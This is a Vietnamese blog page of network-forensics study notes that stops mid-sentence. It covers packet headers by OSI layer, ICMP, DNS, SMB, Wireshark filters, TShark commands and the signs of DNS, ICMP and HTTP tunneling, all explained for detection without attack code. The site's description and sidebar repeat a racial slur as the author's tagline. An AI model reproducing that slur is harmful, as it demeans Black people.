<!doctype html>
<html
  lang="vi-vn" 
  data-theme-mode="auto"
  >
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/><title>
  Archives | deroise2306
</title>
<meta name="description" content="Lovely nigga"/><script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":false,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
  
</script>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>
<link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  /><link rel="stylesheet" href="/css/loader.css" /><meta property="og:type" content="website" />
  <meta property="og:title" content="Archives | deroise2306" />
  <meta
    property="og:description"
    content="Lovely nigga"
  />
  <meta property="og:url" content="http://localhost:1313/archives/test_post/" />
  <meta
    property="og:site_name"
    content="deroise2306&#39;s Home"
  />
  <meta
    property="og:image"
    content="/"
  />
  <meta property="article:author" content="deroise2306" />
  <meta property="article:published_time" content="2026-02-26T00:00:00&#43;00:00" />
  <meta property="article:modified_time" content="2026-02-26T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/" />
<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" /><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
    onload="this.onload=null;this.rel='stylesheet'"
  /><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
    onload="this.onload=null;this.rel='stylesheet'"
  /><script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    
    
    
    
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
    rel="stylesheet"
    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
  <body><div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi "><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg></div><div class="loading-word">Loading...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var loaderEl = document.getElementById('loader');
    var startLoading = () => {
      time = Date.now();
      loaderEl.classList.remove("loading");
    }
    var hideLoader = () => {
      document.body.style.overflow = 'auto';
      loader.classList.add('loading');
    };

    var endLoading = () => {
      if (!time) {
        hideLoader();
      } else {
        if (Date.now() - time > 500) {
          time = null;
          hideLoader();
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    loaderEl.addEventListener('click', endLoading);
  </script><div id="copy-tooltip"></div>
<div id="lang-tooltip">
This article does not have a corresponding language version
</div>
<div id="heatmap-tooltip"></div><div id="container">
      <div id="wrap"><div id="header-nav">
  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><span class="main-nav-link">Home</span>
      </a><a class="main-nav-link-wrap" href="/archives"><span class="main-nav-link">Archives</span>
      </a><a class="main-nav-link-wrap" href="/about"><span class="main-nav-link">About</span>
      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
  </nav>
  <nav id="sub-nav" aria-label="Secondary navigation"></nav></div>
<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="Test"><div id="header-outer">
    <div id="header-title"><span id="logo">
            <h1 data-aos="slide-up">Archives</h1>
          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
  </div>
</header><div id="content"
          aria-label="Page content"
          
          class="sidebar-right"  ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container "><div class="sidebar-wrapper">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    ><div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="deroise2306"
    class="lazyload"
  />
  <div class="sidebar-author-name">deroise2306</div>
  <div class="sidebar-description">Lovely nigga</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">0</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      0
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </a>
</div>
<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a><div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a><div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a><div class="sidebar-menu-link">About</div>
    </div></div></div>
  </div><div class="sidebar-widget"><div class="widget-wrapper">
    <div
      class="widget-wrap"
      data-aos="fade-up"
    >
      <h3 class="widget-title">Recent Posts</h3>
      <div class="widget">
        <ul></ul>
      </div>
    </div>
  </div></div></div></aside>
<section id="main" aria-label="Main content"><article
  class="h-entry article"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta"><div class="article-date">
  <span
    class="article-date-link icon-calendar"
    data-aos="zoom-in"
  >
    <time datetime="2026-02-26 00:00:00 &#43;0000 UTC" itemprop="datePublished"
      >2026-02-26</time
    >
    <time style="display: none;" id="post-update-time"
      >2026-02-26</time
    >
  </span></div>
</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="1-gói-tin">
<a class="header-anchor" href="#1-g%c3%b3i-tin"></a>
1. GÓI TIN
</h1><blockquote>
<ul>
<li><strong>Mô hình OSI &amp; TCP/IP:</strong> Mapping dữ liệu thực tế trong file pcap vào các lớp OSI. Dữ liệu nào nằm ở Layer 2, 3, 4, 7?</li>
</ul>
</blockquote>
<p>Tham chiếu lại hai mô hình;
<img src="https://hackmd.io/_uploads/H15PhfZU-g.png" alt="image"></p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Layer</th>
          <th style="text-align: left">PDU</th>
          <th style="text-align: left">Giao thức</th>
          <th style="text-align: left">Vị trí</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Layer 2 (Data Link)</td>
          <td style="text-align: left">Frame</td>
          <td style="text-align: left">Ethernet II</td>
          <td style="text-align: left">14 bytes đầu</td>
      </tr>
      <tr>
          <td style="text-align: left">Layer 3 (Network)</td>
          <td style="text-align: left">Packet</td>
          <td style="text-align: left">IPv4, IPv6, ICMP</td>
          <td style="text-align: left">Tiếp nối sau Ethernet Frame (thường từ byte 14)</td>
      </tr>
      <tr>
          <td style="text-align: left">Layer 4 (Transport)</td>
          <td style="text-align: left">Segment/Datagram</td>
          <td style="text-align: left">TCP, UDP</td>
          <td style="text-align: left">Tiếp nối sau IP Header</td>
      </tr>
      <tr>
          <td style="text-align: left">Layer 7 (Application)</td>
          <td style="text-align: left">Data/Payload</td>
          <td style="text-align: left">HTTP, DNS, FTP&hellip;</td>
          <td style="text-align: left">Phần dữ liệu còn lại sau cùng.</td>
      </tr>
  </tbody>
</table>
<p>a. Đối chiếu với hex view một gói tin ngẫu nhiên:
<img src="https://hackmd.io/_uploads/ByXWf7bLWg.png" alt="image">
<em>14 bytes đầu: Ethernet frame</em></p>
<p><img src="https://hackmd.io/_uploads/HkYHMXbIZx.png" alt="image">
<em>Phần packet IPv4 ứng với Layer 3 - IP header</em>
<img src="https://hackmd.io/_uploads/ryetzQbIbx.png" alt="image">
<em>Phần Datagram còn lại của TCP</em></p>
<p>b. Về chi tiết cấu trúc các header:
<img src="https://hackmd.io/_uploads/BJ0Vm7ZLWl.png" alt="image">
Thấy rằng trong Ethernet Frame bao gồm các trường thông tin:</p>
<ul>
<li>Địa chỉ MAC của máy gửi và nhận (lần lượt 6 cặp hex đầu và tiếp theo)</li>
<li>Giao thức sử dụng (EtherType): như trên hình là IPv4</li>
</ul>
<p><img src="https://hackmd.io/_uploads/SyciXXb8Wl.png" alt="image">
Với trường tiếp theo 20 bytes, gồm có các phần thông tin:</p>
<ul>
<li>Version và header length thường sẽ là 20 bytes</li>
<li>TOS của gói tin (độ ưu tiên)</li>
<li>Độ dài của IP Header + Payload (Total Length)</li>
<li>ID gói tin</li>
<li>TTL: Số bước nhảy tối đa qua router</li>
<li>Flag (MF và DF, sử dụng trong việc phân mảnh), Protocol, Checksum (kiểm tra tính toàn vẹn) và  và các địa chỉ IP nguồn và đích</li>
</ul>
<p><img src="https://hackmd.io/_uploads/B18cweGUZl.png" alt="image">
Trường cuối cùng với độ dài 24bytes sẽ là TCP Header:</p>
<ul>
<li>Port source và port đích</li>
<li>Sequence Num: thứ tự của gói tin, dùng trong phân mảnh</li>
<li>Ack Num: số xác nhận trạng thái nhận dữ liệu</li>
<li>Data Offset: xác định độ dài TCP Header</li>
<li>Flag: chỉ các trạng thái</li>
<li>Windows Size: kích thước của cửa sổ nhận dữ liệu, quy định số bytes tối đa có thể được gửi hoặc nhận.</li>
</ul>
<h1 id="2-các-giao-thức">
<a class="header-anchor" href="#2-c%c3%a1c-giao-th%e1%bb%a9c"></a>
2. CÁC GIAO THỨC
</h1><p><strong>ICMP (Internet Control Message Protocol):</strong>
Cấu trúc một packet sử dụng giao thức ICMP thường là như sau:
<img src="https://hackmd.io/_uploads/HJYBxbfUbl.png" alt="image">
8 bit đầu tiên cho biết Type của message (loại tin nhắn), cung cấp description về loại tin nhắn sắp nhận được. Một số type phổ biến:</p>
<pre tabindex="0"><code>Type 0 - Echo reply
Type 3 - Destination unreachable
Type 5 - Redirect Message
Type 8 - Echo Request
Type 11 - Time Exceeded
Type 12 - Parameter problem
</code></pre><p>8 bit tiếp theo là trường thông tin code, mang những thông tin thêm về các lỗi, các type
Có thể tham khảo các type, code ở <a href="https://www.ibm.com/docs/en/qsip/7.4.0?topic=applications-icmp-type-code-ids">đây</a>
Checksum tương tự như ở các header khác.
Đối với phần Data thì cấu trúc thường không cố định mà phụ thuộc vào từng type khác nhau sẽ có những cấu trúc khác nhau.
Đối với Type Echo Req/Reply: nhìn chung sẽ là như sau:
<img src="https://hackmd.io/_uploads/rJ5_BH7LZe.png" alt="image">
<em>Ngoài các trường Type, Code, Checksum như đã đề cập ở trên, có thêm các trường Identifier(xác định các tin tương ứng với nhau), Seq Numb (Xác định thứ tự khi phân mảnh)</em>
Còn đối với Destination Unreachable Type, đối chiếu với cấu trúc thường thấy của một packet ICMP thường thấy thì phần Extender 32bit thường bị để trống (Unused)
<img src="https://hackmd.io/_uploads/rJ3lv6XU-l.png" alt="image">
Phần Data/Payload sẽ là các thông tin liên quan đến gói tin bị lỗi (chức năng chính của type này là báo lỗi mà)</p>
<p><strong>TCP, UDP</strong>
So sánh giữa TCP và UDP (tham khảo từ THM): <a href="https://hackmd.io/@deroise2306/Bka33mUy-e#T%E1%BA%A7ng-4-Transport-T%E1%BA%A7ng-giao-v%E1%BA%ADn">tại đây</a>
Ngoài ra em Dũng cũng có ghi chú chi tiết hơn một chút về TCP, UDP và cơ chế Three ways handshake, Four ways handshake <a href="https://hackmd.io/@deroise2306/BJ2fOFPkbe#2-TCPIP">tại đây</a>.</p>
<p><strong>DNS</strong>
Một vài note về DNS: <a href="https://hackmd.io/@deroise2306/SkNIoD1gZl">tại đây</a>.
Bổ sung thông tin:
Cấu trúc Query/Response:
Nhìn chung quy trình sẽ như sau:
<img src="https://hackmd.io/_uploads/Hk-L0a78Zg.png" alt="image">
Về chi tiết gói tin DNS, đối với loại Query thì sẽ như sau:
<img src="https://hackmd.io/_uploads/B1XkJRXI-x.png" alt="image">
Điểm chung giữa các DNS packet thì sẽ luôn có phần header tương tự nhau với các thành phần:</p>
<ul>
<li>Trans ID: đánh số để match queries</li>
<li>Flags</li>
<li>Questions:số lượng truy vấn (queries)</li>
<li>Answer RRs: Lượng record trong phần Answer (RR có nghĩa là resources Record)</li>
<li>Authority RRs: Lượng record trong phần Authority</li>
<li>Aditional RRs: Lượng record trong phần Additional</li>
</ul>
<p><img src="https://hackmd.io/_uploads/Sym-mRQLWl.png" alt="image">
<em>sample gói in query</em>
Riêng với gói tin Query thì phần Queries sẽ chi tiết như sau:
<img src="https://hackmd.io/_uploads/ByZ4ZCmLZl.png" alt="image">
Các trường NAME (tên Domain), Type (Loại DNS Record), Class (lớp, thường là IN - Internet)
Đối với Response Message:
<img src="https://hackmd.io/_uploads/BJMqmR7Ubl.png" alt="image">
Vì đây là phản hổi tương ứng với Query Message, cho nên phần Header và Queries sẽ gần như tương tự với Query Message tương ứng.
<img src="https://hackmd.io/_uploads/Hk7pXAXLZe.png" alt="image">
Phần Ans đã được nâng lên từ 1 thành 3. Mỗi Record Answer cấu trúc sẽ là
<img src="https://hackmd.io/_uploads/H10wIR7L-l.png" alt="image">
<img src="https://hackmd.io/_uploads/ByidU0QU-l.png" alt="image"></p>
<p>(khum giải thích chi tiết nứa heng)
<strong>HTTP/HTTPS</strong>
Em Dúng cũng đã có một note về HTTP/HTTPS <a href="https://hackmd.io/45kzxI-PQGa_NufZcCoF4Q">ở đây </a>
<strong>SMB</strong>
Sơ lược thì cơ chế SMB hoạt động theo cơ chế Client-Server. Quá trình kết nối thiết lập lần lượt qua các bước:</p>
<ul>
<li>Negotiation: Client gửi một danh sách các phiên bản SMB mà nó hỗ trợ (SMB 1.0, 2.0, 3.0&hellip;). Server sẽ phản hồi phiên bản cao nhất mà cả hai cùng đáp ứng</li>
<li>Session Setup: Đây là bước xác thực. Client gửi TT đăng nhập. Sau khi xác thực thành công, Server cấp cho Client một Session ID.</li>
<li>Tree Connect: Client sử dụng Session ID để yêu cầu truy cập vào một thư mục được chia sẻ với quyền hạn được set tuỳ vào đối tượng.</li>
</ul>
<p><strong>Wireshark Analysis</strong>:
Đối với TCP: thực hiện phân tích một capture file sample từ <a href="https://wiki.wireshark.org/SampleCaptures">https://wiki.wireshark.org/SampleCaptures</a>, mở file ta có:
<img src="https://hackmd.io/_uploads/ByaQTPVI-g.png" alt="image">
Để lọc riêng TCP handshake, ta sử dụng filter, lọc ra các gói tin TCP SYN bằng filter <code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code>. Đây thường là gói tin bắt đầu cho quá trình 3W handshake.
<img src="https://hackmd.io/_uploads/rknJSd4Ubx.png" alt="image">
Ở đây ta thấy sự xuất hiện của 2 gói tin, tức là trong file này có 2 luồng TCP Stream. Xem chi tiết các gói tin thuộc từng luồng, ta chọn Follow Stream:
<img src="https://hackmd.io/_uploads/H1qsS_VIWx.png" alt="image">
Nhìn sơ thì có thể thấy 3 gói tin đầu chính là quá trình handshake
<img src="https://hackmd.io/_uploads/rJilIuNI-l.png" alt="image">
Lưu đồ
<img src="https://hackmd.io/_uploads/SJyrP_V8We.png" alt="image">
Đối với DNS, có 2 loại gói tin có thể lọc ra: gói Query và gói Response. Mở một file sample thì ta có:
<img src="https://hackmd.io/_uploads/ry76E54LZg.png" alt="image">
Để lọc gói Query thì ta apply filter <code>dns.flags.reponse == 0</code>:
<img src="https://hackmd.io/_uploads/rk3-BcVL-x.png" alt="image">
và ngược lại, với các gói Response thì filter sẽ là <code>dns.flags.response == 1</code>.
Sau khi Follow thì mình có lưu đồ quá trình phân giải:
<img src="https://hackmd.io/_uploads/ryYMK-r8-g.png" alt="Untitled Diagram.drawio"></p>
<p><strong>Tunneling</strong>
Hiểu khái quát chung về tunneling là việc sử dụng các trường thông tin không được thường sử dụng trong gói tin để truyền tải dữ liệu bổ sung, sử dụng nhiều trong tấn công mạng hay giấu tin.
Cơ chế hoạt động của tunneling dựa trên Encapsulation. Bằng việc đóng gói phần dữ liệu cần gửi đi bằng header mới của giao thức cần truyền tải, khiến gói tin cần truyền đi trở thành phần data của gói tin mới. Việc này dẫn đến việc tạo một đường đi mới (tunnel), khi đi qua đường đi này thì các thiết bị mạng trung gian không rõ thực sự nội dung bên trong. Và khi đến nơi cần đến thì sẽ được mở gói, khôi phục về dạng ban đầu.</p>
<p>Phổ biến nhất ta nhắc đến <strong>DNS Tunneling</strong> (bởi vì là giao thức thiết yếu ít bị chặn hay hạn chế). Attacker nhúng payload độc hại vào trong gói tin DNS, thiết lập tunnel gửi đến máy nạn nhân tránh bị ngăn lại bởi các biện pháp bảo mật. Việc lấy dữ liệu từ máy nạn nhân cũng có thể được tận dụng từ phương thức này.
<img src="https://hackmd.io/_uploads/SyrpmzrUWx.png" alt="image"></p>
<p>Dấu hiệu nhận biết:</p>
<ul>
<li>Độ dài tên miền (High Entropy): Các truy vấn DNS có subdomain rất dài, trông như một chuỗi ký tự ngẫu nhiên (Base64). Ngoài ra là các tên miền kì lạ cũng là một dấu hiệu</li>
<li>Tần suất cực cao: Số lượng yêu cầu DNS tăng đột biến từ một máy trạm duy nhất tới một domain lạ.</li>
<li>Loại bản ghi lạ: Xuất hiện nhiều bản ghi loại TXT hoặc NULL (vốn có thể chứa nhiều dữ liệu hơn bản ghi A thông thường).</li>
</ul>
<p>Một loại khác là <strong>ICMP Tunneling</strong>, hay còn gọi là Ping Tunneling với việc tận dụng trường thông tin không được sử dụng trong gói tin ping. Với các dấu hiệu có thể là:</p>
<ul>
<li>Kích thước gói tin Ping lớn: Thông thường gói ping rất nhỏ (32-64 bytes). Nếu thấy gói ping có dung lượng bất thường, đó là tunneling.</li>
<li>Tần suất Ping liên tục: Gửi hàng nghìn gói ping liên tục (Flood) mà không có mục đích kiểm tra kết nối rõ ràng.</li>
<li>Nội dung Payload: Nếu soi bằng Wireshark, phần dữ liệu bên trong gói ICMP không phải là các ký tự lặp lại (abcdef&hellip;) mà là dữ liệu có cấu trúc rõ ràng hoặc mã hóa.</li>
</ul>
<p><strong>HTTP/HTTPS Tunneling</strong> cũng là một hình thức tấn công phổ biến. Khi nhắc đến HTTP/HTTPS Tunneling thì ta chú ý đến phương thức CONNECT và HTTP Proxy. Với việc Proxy đóng vai trò trung gian trong kết nối, tận dụng việc proxy không thể đọc được các các traffic bị mã hoá thì attacker nhúng các phần độc hại vào gói tin CONNECT, Proxy không đọc được nên cho qua =&gt; target bị tấn công.
Vì thế dấu hiệu nhận biết sẽ là việc xuất hiện nhiều yêu cầu CONNECT trong log của Web Proxy tới các cổng lạ (không phải 80/443).</p>
<h1 id="3-các-công-cụ">
<a class="header-anchor" href="#3-c%c3%a1c-c%c3%b4ng-c%e1%bb%a5"></a>
3. CÁC CÔNG CỤ
</h1><p><strong>Wireshark</strong></p>
<ul>
<li>Display Filter: chức năng quan trọng của wireshark, sử dụng để lọc các gói tin theo các bộ lọc do user chọn. Cụ thể về các expressions có thể xem <a href="https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html#_display_filter_fields">ở đây</a>.
Nâng cao hơn, có thể kết hợp các toán tử, các điều kiện,&hellip; lọc ra các gói tin cụ thể để phân tích.</li>
<li>Follow TCP/UDP Stream hay rộng hơn là <a href="https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html#ChAdvFollowStream">Follow Protocols Stream </a>nói chung, giúp cho người dùng có thể xem trực tiếp các data của một luồng một cách trực quan, dễ hiểu.</li>
<li>Export Objects: sử dụng để xuất ra các file được trao đổi trong luồng</li>
<li>Statistics/Conversation: minh hoạ sự trao đổi gói tin dưới dạng cuộc nói chuyện (y như tên =))) =&gt; giúp phân tích mối quan hệ giữa các địa chỉ, các máy với nhau.</li>
</ul>
<p><strong>TShark</strong>
Được cài đặt cùng với Wireshark, là CLI Application.
Điểm vượt trội của Tshark so với Wireshark là khả năng xử lí các file lớn, có khả năng cắt các file cực lớn =&gt; các file nhỏ hơn để dễ dàng handle.
Một số cách cắt file: cắt file theo thời gian, theo lượng packet. Ngoài ra còn có thể lọc các packet ra một file theo các criteria cụ thể ví dụ như là địa chỉ, protocol, &hellip;
Có thể tham khảo cú pháp của Tshark như sau:
:::spoiler</p>
<pre tabindex="0"><code>TShark (Wireshark) 3.3.2 (v3.3.2rc0-16-g1936fef77a42)
Dump and analyze network traffic.
See https://www.wireshark.org for more information.

Usage: tshark [options] ...


Capture interface:
  -i &lt;interface&gt;, --interface &lt;interface&gt;
                           name or idx of interface (def: first non-loopback)
  -f &lt;capture filter&gt;      packet filter in libpcap filter syntax
  -s &lt;snaplen&gt;, --snapshot-length &lt;snaplen&gt;
                           packet snapshot length (def: appropriate maximum)
  -p, --no-promiscuous-mode
                           don&#39;t capture in promiscuous mode
  -I, --monitor-mode       capture in monitor mode, if available
  -B &lt;buffer size&gt;, --buffer-size &lt;buffer size&gt;
                           size of kernel buffer (def: 2MB)
  -y &lt;link type&gt;, --linktype &lt;link type&gt;
                           link layer type (def: first appropriate)
  --time-stamp-type &lt;type&gt; timestamp method for interface
  -D, --list-interfaces    print list of interfaces and exit
  -L, --list-data-link-types
                           print list of link-layer types of iface and exit
  --list-time-stamp-types  print list of timestamp types for iface and exit
  
  
Capture stop conditions:
  -c &lt;packet count&gt;        stop after n packets (def: infinite)
  -a &lt;autostop cond.&gt; ..., --autostop &lt;autostop cond.&gt; ...
                           duration:NUM - stop after NUM seconds
                           filesize:NUM - stop this file after NUM KB
                              files:NUM - stop after NUM files
                            packets:NUM - stop after NUM packets
                            
Capture output:
  -b &lt;ringbuffer opt.&gt; ..., --ring-buffer &lt;ringbuffer opt.&gt;
                           duration:NUM - switch to next file after NUM secs
                           filesize:NUM - switch to next file after NUM KB
                              files:NUM - ringbuffer: replace after NUM files
                            packets:NUM - switch to next file after NUM packets
                           interval:NUM - switch to next file when the time is
                                          an exact multiple of NUM secs
                                          
Input file:
  -r &lt;infile&gt;, --read-file &lt;infile&gt;
                           set the filename to read from (or &#39;-&#39; for stdin)

Processing:
  -2                       perform a two-pass analysis
  -M &lt;packet count&gt;        perform session auto reset
  -R &lt;read filter&gt;, --read-filter &lt;read filter&gt;
                           packet Read filter in Wireshark display filter syntax
                           (requires -2)
  -Y &lt;display filter&gt;, --display-filter &lt;display filter&gt;
                           packet displaY filter in Wireshark display filter
                           syntax
  -n                       disable all name resolutions (def: all enabled)
  -N &lt;name resolve flags&gt;  enable specific name resolution(s): &#34;mnNtdv&#34;
  -d &lt;layer_type&gt;==&lt;selector&gt;,&lt;decode_as_protocol&gt; ...
                           &#34;Decode As&#34;, see the man page for details
                           Example: tcp.port==8888,http
  -H &lt;hosts file&gt;          read a list of entries from a hosts file, which will
                           then be written to a capture file. (Implies -W n)
  --enable-protocol &lt;proto_name&gt;
                           enable dissection of proto_name
  --disable-protocol &lt;proto_name&gt;
                           disable dissection of proto_name
  --enable-heuristic &lt;short_name&gt;
                           enable dissection of heuristic protocol
  --disable-heuristic &lt;short_name&gt;
                           disable dissection of heuristic protocol
                           
Output:
  -w &lt;outfile|-&gt;           write packets to a pcapng-format file named &#34;outfile&#34;
                           (or &#39;-&#39; for stdout)
  --capture-comment &lt;comment&gt;
                           set the capture file comment, if supported
  -C &lt;config profile&gt;      start with specified configuration profile
  -F &lt;output file type&gt;    set the output file type, default is pcapng
                           an empty &#34;-F&#34; option will list the file types
  -V                       add output of packet tree        (Packet Details)
  -O &lt;protocols&gt;           Only show packet details of these protocols, comma
                           separated
  -P, --print              print packet summary even when writing to a file
  -S &lt;separator&gt;           the line separator to print between packets
  -x                       add output of hex and ASCII dump (Packet Bytes)
  -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|?
                           format of text output (def: text)
  -j &lt;protocolfilter&gt;      protocols layers filter if -T ek|pdml|json selected
                           (e.g. &#34;ip ip.flags text&#34;, filter does not expand child
                           nodes, unless child is specified also in the filter)
  -J &lt;protocolfilter&gt;      top level protocol filter if -T ek|pdml|json selected
                           (e.g. &#34;http tcp&#34;, filter which expands all child nodes)
  -e &lt;field&gt;               field to print if -Tfields selected (e.g. tcp.port,
                           _ws.col.Info)
                           this option can be repeated to print multiple fields
  -E &lt;fieldsoption&gt;=&lt;value&gt; set options for output when -Tfields selected:
     bom=y|n               print a UTF-8 BOM
     header=y|n            switch headers on and off
     separator=/t|/s|&lt;char&gt; select tab, space, printable character as separator
     occurrence=f|l|a      print first, last or all occurrences of each field
     aggregator=,|/s|&lt;char&gt; select comma, space, printable character as
                           aggregator
     quote=d|s|n           select double, single, no quotes for values
  -t a|ad|adoy|d|dd|e|r|u|ud|udoy
                           output format of time stamps (def: r: rel. to first)
  -u s|hms                 output format of seconds (def: s: seconds)
  -l                       flush standard output after each packet
  -q                       be more quiet on stdout (e.g. when using statistics)
  -Q                       only log true errors to stderr (quieter than -q)
  -g                       enable group read access on the output file(s)
  -W n                     Save extra information in the file, if supported.
                           n = write network address resolution information
  -X &lt;key&gt;:&lt;value&gt;         eXtension options, see the man page for details
  -U tap_name              PDUs export mode, see the man page for details
  -z &lt;statistics&gt;          various statistics, see the man page for details
  --export-objects &lt;protocol&gt;,&lt;destdir&gt;
                           save exported objects for a protocol to a directory
                           named &#34;destdir&#34;
  --color                  color output text similarly to the Wireshark GUI,
                           requires a terminal with 24-bit color support
                           Also supplies color attributes to pdml and psml formats
                           (Note that attributes are nonstandard)
  --no-duplicate-keys      If -T json is specified, merge duplicate keys in an object
                           into a single key with as value a json array containing all
                           values
  --elastic-mapping-filter &lt;protocols&gt; If -G elastic-mapping is specified, put only the
                           specified protocols within the mapping file

Miscellaneous:

  -h, --help               display this help and exit
  -v, --version            display version info and exit
  -o &lt;name&gt;:&lt;value&gt; ...    override preference setting
  -K &lt;keytab&gt;              keytab file to use for kerberos decryption
  -G [report]              dump one of several available reports and exit
                           default report=&#34;fields&#34;
                           use &#34;-G help&#34; for more help                     
</code></pre><p>:::
Để cắt file theo thời gian (ví dụ ta biết rõ thời gian cần điều tra là từ thời điểm A đến B):</p>
<pre tabindex="0"><code>tshark -r input.pcap -Y &#34;frame.time &gt;= \&#34;YYYY-MM-DD HH:MM:SS\&#34; &amp;&amp; frame.time &lt;= \&#34;YYYY-MM-DD HH:MM:SS\&#34;&#34; -w output.pcap
</code></pre><p>Để cắt theo số lượng/STT gói tin:</p>
<pre tabindex="0"><code>tshark -r input.pcap -Y &#34;frame.number &gt;= A &amp;&amp; frame.number &lt;= B&#34; -w output.pcap
</code></pre><p>hoặc lọc theo giao thức:</p>
